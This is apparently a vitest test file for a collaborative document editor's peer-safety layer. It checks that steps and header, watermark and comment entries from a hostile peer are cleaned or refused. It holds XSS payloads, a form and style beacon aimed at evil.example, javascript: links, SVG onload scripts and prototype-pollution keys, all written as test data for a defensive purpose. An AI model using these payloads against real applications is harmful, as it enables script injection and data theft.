import { parseDocx } from '@genoffice/docx-engine'
import { MAX_CHANGE_BYTES, type CollabAdapter, type Json } from '@seuoffice/collab/client'
import { Editor, getSchema } from '@tiptap/core'
import { Transform } from '@tiptap/pm/transform'
import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterEach, beforeAll, describe, expect, it } from 'vitest'
import { buildDocx } from '../../../packages/docx-engine/tests/helpers/build-docx'
import { blocksToPmDoc, type PmNode as PmNodeJson } from '../src/renderer/editor/convert'
import { equationBlockJson, inlineEquationNodeJson } from '../src/renderer/editor/equation'
import { editorExtensions } from '../src/renderer/editor/extensions'
import { createDocsAdapter, type DocsOp, type SideStore } from '../src/web/collab-adapter'
import { safeNode, safeStep } from '../src/web/collab-safety'

const para = (text: string) => `<w:p><w:r><w:t xml:space="preserve">${text}</w:t></w:r></w:p>`

let content: unknown
const editors: Editor[] = []

beforeAll(async () => {
  content = blocksToPmDoc(
    (await parseDocx(await buildDocx({ bodyXml: para('alpha beta') }))).blocks,
  )
})

afterEach(() => {
  for (const editor of editors.splice(0)) editor.destroy()
})

interface Page {
  editor: Editor
  adapter: CollabAdapter<DocsOp>
  /** the ops this page handed the engine, oldest first */
  sent: DocsOp[]
  refused: string[]
  /** the App's outside state, and its own changes to it */
  entries(): Map<string, Json>
  set(key: string, value: Json): void
}

/** One person's page: a real editor, an App holding the outside state, and the adapter */
function page(): Page {
  const editor = new Editor({
    element: document.createElement('div'),
    extensions: editorExtensions,
    content: content as never,
  })
  editors.push(editor)
  let entries = new Map<string, Json>()
  let changed: (() => void) | null = null
  const side: SideStore = {
    read: () => new Map(entries),
    write: ({ entries: next }) => {
      entries = new Map(entries)
      for (const [key, value] of next) {
        if (value === null) entries.delete(key)
        else entries.set(key, value)
      }
    },
    observe: (handler) => {
      changed = handler
      return () => (changed = null)
    },
  }
  const refused: string[] = []
  const adapter = createDocsAdapter({
    editor,
    side,
    // the file as these tests read it: the body and the outside entries the save writes
    produce: async (shown) => ({
      fileName: 'memo.json',
      bytes: new TextEncoder().encode(JSON.stringify({ doc: editor.getJSON(), side: [...shown] })),
    }),
    maxOpBytes: MAX_CHANGE_BYTES - 4096,
    refused: (reason) => refused.push(reason),
  })
  const sent: DocsOp[] = []
  adapter.listen((ops) => sent.push(...ops))
  return {
    editor,
    adapter,
    sent,
    refused,
    entries: () => entries,
    set(key, value) {
      entries = new Map(entries).set(key, value)
      changed?.()
    },
  }
}

/** `to` takes `ops` from `from` over the wire, as confirmed changes it did not make */
function carry(ops: DocsOp[], from: Page, to: Page): void {
  to.adapter.integrate(
    ops.map((op) => to.adapter.decode(from.adapter.encode(op))),
    [],
  )
  from.adapter.confirmed?.(ops)
}

/** where "alpha" ends, or where its paragraph ends */
function after(editor: Editor, block: boolean): number {
  let pos = -1
  editor.state.doc.descendants((node, at) => {
    if (pos < 0 && node.isTextblock) pos = block ? at + node.nodeSize : at + 1 + 'alpha'.length
    return pos < 0
  })
  return pos
}

/** insert `nodes` (JSON) after "alpha" as this person's own edit */
function insert(p: Page, nodes: Json[], block = false): void {
  const fragment = nodes.map((json) => p.editor.schema.nodeFromJSON(json))
  p.editor.view.dispatch(p.editor.state.tr.insert(after(p.editor, block), fragment))
}

/**
 * The op a hostile client sends for inserting `nodes` after "alpha": made
 * outside any editor, so no rule of the sending page saw it.
 */
function forged(p: Page, nodes: Json[], block = false): Json {
  const fragment = nodes.map((json) => p.editor.schema.nodeFromJSON(json))
  const step = new Transform(p.editor.state.doc).insert(after(p.editor, block), fragment).steps[0]
  return { kind: 'steps', steps: [step.toJSON() as Json] }
}

const receive = (p: Page, op: Json) => p.adapter.integrate([p.adapter.decode(op)], [])

const HOSTILE_MARKUP =
  '<style>body{display:none}</style><form action="https://evil.example/"><input name="p"></form>' +
  '<img src="x" onerror="alert(1)"><meta http-equiv="refresh" content="0;url=https://evil.example/">' +
  '<a href="javascript:alert(1)">x</a>'
const HOSTILE_SVG =
  'data:image/svg+xml,' +
  encodeURIComponent(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>',
  )
const PNG =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
const STYLE_ESCAPE = '000;position:fixed;inset:0;background:url(https://evil.example/beacon)'

/** a node as the JSON a step carries */
type NodeJson = { type: string; attrs: { [key: string]: Json }; [key: string]: Json }
const asJson = (node: PmNodeJson): NodeJson => JSON.parse(JSON.stringify(node)) as NodeJson

/** what a hostile peer can make the receiving editor draw */
function hostile(): { inline: Json[]; block: Json[] } {
  const equation = asJson(inlineEquationNodeJson('x^2'))
  const display = asJson(equationBlockJson('y^2'))
  const formula = display.attrs.formulaDisplay as { [key: string]: Json }
  return {
    inline: [
      { ...equation, attrs: { ...equation.attrs, mathml: HOSTILE_MARKUP } },
      // markup that is not a string still reaches innerHTML through String()
      { ...equation, attrs: { ...equation.attrs, mathml: [HOSTILE_MARKUP] } },
      { ...equation, attrs: { ...equation.attrs, mathml: { toString: HOSTILE_MARKUP } } },
      { type: 'docInlineImage', attrs: { dataUrl: HOSTILE_SVG, widthPx: 10, heightPx: 10 } },
      {
        type: 'docInlineImage',
        attrs: { dataUrl: 'data:image/svg+xml,<svg onload=alert(1)>', widthPx: 10, heightPx: 10 },
      },
      {
        type: 'text',
        text: 'link',
        marks: [
          { type: 'link', attrs: { href: 'java\tscript:alert(1)' } },
          { type: 'docTextStyle', attrs: { color: STYLE_ESCAPE, font: 'x";position:fixed;"' } },
        ],
      },
    ],
    block: [
      {
        ...display,
        attrs: { ...display.attrs, formulaDisplay: { ...formula, mathml: HOSTILE_MARKUP } },
      },
      // a node-shaped wrapper: every key of it is still judged
      {
        ...display,
        attrs: {
          ...display.attrs,
          formulaDisplay: {
            type: 'x',
            attrs: {},
            tokens: ['x'],
            omml: '<m:oMath/>',
            mathml: HOSTILE_MARKUP,
          },
        },
      },
    ],
  }
}

/** a legitimate equation, link and picture */
const legitimate = (): Json[] => [
  asJson(inlineEquationNodeJson('a+b')),
  {
    type: 'text',
    text: 'site',
    marks: [{ type: 'link', attrs: { href: 'https://example.com/' } }],
  },
  { type: 'docInlineImage', attrs: { dataUrl: PNG, widthPx: 10, heightPx: 10 } },
]

/** every way the hostile values above could show in a page */
function threats(editor: Editor): string[] {
  const dom = editor.view.dom
  const found: string[] = []
  for (const element of dom.querySelectorAll('style, form, meta, script, input, iframe'))
    found.push(`<${element.localName}>`)
  for (const element of [dom, ...dom.querySelectorAll('*')]) {
    for (const { name, value } of element.attributes) {
      if (/^on/i.test(name)) found.push(`${name} on <${element.localName}>`)
      if (/href$/i.test(name) && /script:/i.test(value.replace(/\s/g, '')))
        found.push(`${name}=${value}`)
      if (name === 'src' && value.startsWith('data:image/svg')) found.push('svg src')
      if (name === 'style' && /url\(|position:\s*fixed/i.test(value)) found.push(`style=${value}`)
    }
  }
  return found
}

describe('a peer’s step carrying markup, scripts and style escapes', () => {
  it('shows none of it on the pages that receive it, and they agree', async () => {
    const alice = page()
    const bob = page()
    const carol = page()
    const { inline, block } = hostile()
    // the block first: it lands after the paragraph, so the inline op's position still holds
    const ops = [forged(alice, block, true), forged(alice, inline)]
    for (const to of [bob, carol]) for (const op of ops) receive(to, op)
    expect(threats(bob.editor)).toEqual([])
    expect(threats(carol.editor)).toEqual([])
    // the equations still draw: their markup is rebuilt from their OMML
    expect(bob.editor.view.dom.querySelectorAll('math').length).toBe(2)
    expect(await carol.adapter.fingerprint()).toBe(await bob.adapter.fingerprint())
  })

  it('still shows a peer’s equation, link and picture', () => {
    const alice = page()
    const bob = page()
    insert(alice, legitimate())
    carry(alice.sent.splice(0), alice, bob)
    const dom = bob.editor.view.dom
    expect(dom.querySelector('math')).not.toBeNull()
    expect(dom.querySelector('a[href="https://example.com/"]')).not.toBeNull()
    expect(dom.querySelector(`img[src="${PNG}"]`)).not.toBeNull()
    expect(bob.editor.state.doc.toJSON()).toEqual(alice.editor.state.doc.toJSON())
  })
})

describe('this person’s own edit holding a value the peers would replace', () => {
  it('is refused before it applies, and editing goes on', () => {
    const alice = page()
    const before = alice.editor.state.doc
    const { inline, block } = hostile()
    for (const node of inline) insert(alice, [node])
    insert(alice, block, true)
    // the attribute changes a paste-free edit can make
    const at = after(alice.editor, false)
    alice.editor.view.dispatch(
      alice.editor.state.tr.addMark(
        1,
        at,
        alice.editor.schema.marks.link.create({ href: 'javascript:alert(1)' }),
      ),
    )
    alice.editor.view.dispatch(
      alice.editor.state.tr.setNodeAttribute(0, 'tabStops', '[{"__proto__":{"pos":1}}]'),
    )
    expect(alice.editor.state.doc).toBe(before)
    expect(alice.sent).toEqual([])
    // one per inline insert, the block insert, the link mark and the attribute change
    expect(alice.refused).toEqual(Array(inline.length + 3).fill('unsafe'))
    insert(alice, legitimate())
    expect(alice.sent).toHaveLength(1)
    expect(threats(alice.editor)).toEqual([])
  })

  it('in the outside state is not sent, and the App shows the confirmed value again', () => {
    const alice = page()
    const header = { header: { text: 'Title', paras: [] }, headerDirty: true }
    alice.set('header', header)
    expect(alice.sent).toEqual([{ kind: 'side', key: 'header', value: header }])
    alice.set('header', {
      header: { text: 'Title', paras: [{ runs: [{ text: 'a', color: STYLE_ESCAPE }] }] },
      headerDirty: true,
    })
    expect(alice.sent).toHaveLength(1)
    expect(alice.entries().get('header')).toEqual(header)
    expect(alice.refused).toEqual(['unsafe'])
  })

  it('leaves the sender and a receiver with the same file after a mix of edits', async () => {
    const alice = page()
    const bob = page()
    insert(alice, legitimate())
    insert(alice, hostile().inline)
    carry(alice.sent.splice(0), alice, bob)
    bob.editor.view.dispatch(
      bob.editor.state.tr.addMark(1, 6, bob.editor.schema.marks.bold.create()),
    )
    carry(bob.sent.splice(0), bob, alice)
    alice.set('header', { header: { text: 'Title', paras: [] }, headerDirty: true })
    alice.set('watermark', {
      watermark: 'DRAFT',
      watermarkPicture: { dataUrl: 'javascript:alert(1)' },
    })
    alice.set('comment:1', { id: '1', author: "O'Brien", text: 'see <b>this</b>; "quoted"' })
    carry(alice.sent.splice(0), alice, bob)
    expect(alice.refused).toEqual(['unsafe', 'unsafe'])
    const file = async (p: Page) =>
      JSON.parse(new TextDecoder().decode((await p.adapter.produceFile()).bytes)) as Json
    expect(await file(bob)).toEqual(await file(alice))
    expect(await bob.adapter.fingerprint()).toBe(await alice.adapter.fingerprint())
  })
})

/** an outside-state entry as a page receives it from a peer */
function received(key: string, value: Json): Json {
  const op = page().adapter.decode({ kind: 'side', key, value })
  if (op.kind !== 'side') throw new Error('not a side op')
  return op.value
}

describe('a peer’s outside-state entries', () => {
  it('lose the links, pictures and style escapes headers, watermarks and comments could draw', () => {
    const header = received('header', {
      header: {
        text: 'Title',
        paras: [
          {
            runs: [
              { text: 'a', color: STYLE_ESCAPE, link: { href: 'javascript:alert(1)' } },
              { text: 'b', image: { dataUrl: HOSTILE_SVG, widthPx: 'x"><style>' } },
            ],
          },
        ],
      },
      headerDirty: true,
    })
    expect(header).toEqual({
      header: {
        text: 'Title',
        paras: [
          {
            runs: [
              { text: 'a', color: '', link: { href: '' } },
              { text: 'b', image: { dataUrl: '', widthPx: '' } },
            ],
          },
        ],
      },
      headerDirty: true,
    })
    expect(
      received('watermark', {
        watermark: 'DRAFT',
        watermarkStyle: { fontFamily: 'x";position:fixed', colorHex: 'C0C0C0' },
        watermarkPicture: { dataUrl: 'javascript:alert(1)' },
      }),
    ).toEqual({
      watermark: 'DRAFT',
      watermarkStyle: { fontFamily: '', colorHex: 'C0C0C0' },
      watermarkPicture: { dataUrl: '' },
    })
    // a comment's words and author stay as written
    const comment = { id: '5', author: "O'Brien", text: 'see <b>this</b>; "quoted"' }
    expect(received('comment:5', comment)).toEqual(comment)
  })

  it('judge a step-shaped object inside an entry by its own keys', () => {
    // only a real step's `value` is judged as the attribute it names
    const nested = received('header', {
      header: { text: 'T', paras: [{ stepType: 'attr', attr: 'text', value: STYLE_ESCAPE }] },
      headerDirty: true,
    })
    expect(JSON.stringify(nested)).not.toMatch(/position:fixed/)
  })

  it('judge every key of a node-shaped wrapper', () => {
    // what the App gets: none of the payloads survive
    const header = received('header', {
      type: 'x',
      attrs: {},
      headerDirty: true,
      header: {
        text: 'T',
        paras: [
          {
            runs: [
              {
                text: 'a',
                link: { href: 'javascript:alert(1)' },
                image: {
                  rule: { colorHex: '000;position:fixed;inset:0;z-index:99999;background:#fff' },
                },
              },
            ],
          },
        ],
      },
    })
    expect(JSON.stringify(header)).not.toMatch(/javascript:|position:fixed/)
  })

  it('keep a numbering format’s text as written, unless it breaks a line', () => {
    const level = (lvlText: string) => ({
      numFmt: 'decimal',
      lvlText,
      indentLeft: 720,
      hanging: 360,
    })
    const formats = ['<%1>', "'%1'", '{%1}', '%1;', '"%1"']
    const numbering = { numId: '7', kind: 'ordered', levels: formats.map(level) }
    expect(received('num:7', numbering)).toEqual(numbering)
    // the marker goes into a CSS string, which a line break would end
    const broken = { numId: '8', kind: 'ordered', levels: [level('%1\n;position:fixed')] }
    expect(received('num:8', broken)).toEqual({ ...broken, levels: [level('')] })
    // and this person may define one
    const alice = page()
    alice.set('num:7', numbering)
    expect(alice.refused).toEqual([])
    expect(alice.sent).toEqual([{ kind: 'side', key: 'num:7', value: numbering }])
  })
})

describe('keys that name the prototype chain', () => {
  // JSON.parse makes them own keys, as a frame from the wire does
  const wire = (text: string) => JSON.parse(text) as Json

  it('make decode throw, in an entry key, an entry, a step and JSON inside a step', () => {
    const { adapter } = page()
    for (const key of ['__proto__', 'style:__proto__', 'sectionHf:constructor', 'prototype']) {
      expect(() => adapter.decode({ kind: 'side', key, value: {} }), key).toThrow()
    }
    expect(() =>
      adapter.decode({ kind: 'side', key: 'header', value: wire('{"header":{"__proto__":{}}}') }),
    ).toThrow()
    const mark = wire('{"type":"bold","attrs":{"constructor":{"x":1}}}')
    expect(() =>
      adapter.decode({ kind: 'steps', steps: [{ stepType: 'addMark', from: 1, to: 2, mark }] }),
    ).toThrow()
    const tabStops = '[{"prototype":{"pos":1}}]'
    expect(() =>
      adapter.decode({
        kind: 'steps',
        steps: [{ stepType: 'attr', pos: 0, attr: 'tabStops', value: tabStops }],
      }),
    ).toThrow()
  })

  it('make decode throw on a number JSON cannot hold, and on nesting deeper than any document', () => {
    const { adapter } = page()
    const infinite = JSON.parse(
      '{"kind":"steps","steps":[{"stepType":"attr","pos":0,"attr":"indentLeft","value":1e999}]}',
    ) as Json
    expect(() => adapter.decode(infinite)).toThrow()
    let deep: Json = 'x'
    for (let i = 0; i < 1000; i++) deep = { inner: deep }
    expect(() => adapter.decode({ kind: 'side', key: 'header', value: deep })).toThrow()
    // a local edit holding either never applies
    const alice = page()
    alice.set('header', deep)
    alice.editor.view.dispatch(alice.editor.state.tr.setNodeAttribute(0, 'indentLeft', Infinity))
    expect(alice.refused).toEqual(['unsafe', 'unsafe'])
    expect(alice.sent).toEqual([])
  })
})

/** every docx this repository keeps as a fixture */
function fixtures(): string[] {
  const root = join(__dirname, '../../..')
  const found: string[] = []
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      if (entry.name === 'node_modules' || entry.name.startsWith('.')) continue
      const path = join(dir, entry.name)
      if (entry.isDirectory()) walk(path)
      else if (entry.name.endsWith('.docx')) found.push(path)
    }
  }
  for (const dir of ['apps/docs/tests', 'packages/docx-engine/tests', 'packages/docx2hwp/tests'])
    walk(join(root, dir))
  walk(join(root, 'fixtures'))
  return found
}

describe('what the app itself makes', () => {
  it('passes every fixture document unchanged, and refuses no paste of one', async () => {
    const schema = getSchema(editorExtensions)
    let checked = 0
    for (const path of fixtures()) {
      let parsed
      try {
        parsed = await parseDocx(new Uint8Array(readFileSync(path)))
      } catch {
        // the encrypted fixtures and the deliberately broken ones
        continue
      }
      const doc = asJson(blocksToPmDoc(parsed.blocks))
      expect(safeNode(doc, {}), path).toBe(doc)
      // the whole body pasted over itself, as a local step: from the nodes as the editor
      // holds them, not through JSON, so no value only a round trip would clean is hidden
      const node = schema.nodeFromJSON(blocksToPmDoc(parsed.blocks))
      const step = new Transform(node).replaceWith(0, node.content.size, node.content).steps[0]
      const json = step.toJSON() as Json
      expect(safeStep(json), path).toBe(json)
      checked++
    }
    expect(checked).toBeGreaterThan(170)
  }, 300_000)
})
